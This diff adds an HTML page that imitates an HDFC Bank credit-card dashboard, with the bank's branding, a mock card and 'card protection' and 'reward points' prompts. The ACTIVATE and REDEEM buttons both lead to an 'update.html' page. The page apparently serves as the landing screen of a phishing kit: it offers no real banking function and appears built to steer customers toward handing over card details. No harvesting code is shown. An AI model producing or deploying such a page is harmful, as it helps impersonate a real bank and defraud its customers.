@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank - Credit Card Dashboard</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Top Navigation -->
+    <header class="main-header">
+        <div class="logo-container">
+            <img src="3e834224c5fd5554a019d56b4902b706.png" alt="HDFC Logo" class="brand-logo">
+            <span class="brand-text">HDFC BANK</span>
+        </div>
+        <div class="menu-icon">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+    </header>
+
+    <main class="dashboard-container">
+        <!-- Hero Banner -->
+        <section class="hero-banner">
+            <div class="hero-content">
+                <h2>India's First <br><span>Interactive Credit Card</span></h2>
+                <p>HDFC Bank Millennia Credit Card!</p>
+                <div class="hero-stats">
+                    <div class="stat-item">
+                        <img src="https://img.icons8.com/ios-filled/50/ffffff/safe.png" alt="safe">
+                        <span>High <br>Security</span>
+                    </div>
+                    <div class="stat-item">
+                        <img src="https://img.icons8.com/ios-filled/50/ffffff/star.png" alt="points">
+                        <span>Unlimited <br>Rewards</span>
+                    </div>
+                </div>
+                <button class="btn-apply">Apply Now</button>
+            </div>
+            <div class="card-visual">
+                <div class="credit-card">
+                    <div class="card-chip"></div>
+                    <div class="card-number">**** **** **** 8821</div>
+                    <div class="card-holder">HDFC CUSTOMER</div>
+                    <div class="card-logo">HDFC BANK</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Card Protection -->
+        <section class="info-card">
+            <div class="card-header">
+                <h3>Card Protection</h3>
+            </div>
+            <div class="card-body">
+                <p>Protect yourself with India's first comprehensive card protection service. Stay safe from card loss, theft, and fraud with 24/7 support.</p>
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="window.location.href='update.html'">ACTIVATE</button>
+                    <button class="btn btn-outline">DEACTIVATE</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Reward Points -->
+        <section class="info-card">
+            <div class="card-header">
+                <h3>Redeem Your Reward Points</h3>
+            </div>
+            <div class="card-body">
+                <p>Make the most of your HDFC Credit Card! Redeem points for gifts, vouchers, travel deals, and cashbacks instantly.</p>
+                <button class="btn btn-primary btn-wide" onclick="window.location.href='update.html'">REDEEM</button>
+            </div>
+        </section>
+
+        <!-- Activation Guidelines -->
+        <section class="info-card">
+            <div class="card-header">
+                <h3>Credit Card Activation Guideline</h3>
+            </div>
+            <div class="card-body">
+                <p>Follow the steps to activate your credit card securely and enjoy all banking services instantly without any delay.</p>
+                <button class="btn btn-outline btn-wide">VIEW GUIDE</button>
+            </div>
+        </section>
+    </main>
+
+    <footer class="bottom-nav">
+        <div class="nav-item active">
+            <img src="https://img.icons8.com/ios-filled/50/004c8f/home.png" alt="home">
+            <span>Home</span>
+        </div>
+        <div class="nav-item">
+            <img src="https://img.icons8.com/ios/50/5f6368/card-wallet.png" alt="cards">
+            <span>Cards</span>
+        </div>
+        <div class="nav-item">
+            <img src="https://img.icons8.com/ios/50/5f6368/user.png" alt="profile">
+            <span>Profile</span>
+        </div>
+    </footer>
+
+    <script>
+        // Smooth entry animation
+        document.addEventListener('DOMContentLoaded', () => {
+            const cards = document.querySelectorAll('.info-card');
+            cards.forEach((card, index) => {
+                setTimeout(() => {
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }, 100 * index);
+            });
+        });
+    </script>
+</body>
+</html>
